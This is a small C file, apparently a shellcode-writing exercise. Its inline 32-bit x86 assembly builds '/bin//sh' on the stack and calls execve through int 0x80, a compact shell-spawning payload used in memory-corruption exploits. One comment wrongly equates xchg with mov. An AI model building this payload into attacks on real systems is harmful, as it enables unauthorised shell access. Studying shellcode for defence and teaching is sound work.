/*
 * build 32 bit(-m32) binary on 64 bit machine
 * assembly : intel syntax
 *
 * gcc -o asm_optimization_shell_21_intel_new asm_optimization_shell_21_intel_new.c -m32 -masm=intel -mpreferred-stack-boundary=2
 */
void main()
{
	__asm__(
	"xor    ecx, ecx;"
	"push   0xb;"
	"pop    eax;"
	"cdq;"
	"push   edx;"
	"push   0x68732f2f;"
	"push   0x6e69622f;"
	"xchg   ebx, esp;"        // == mov ebx, esp;
	"int    0x80;"
	);
}
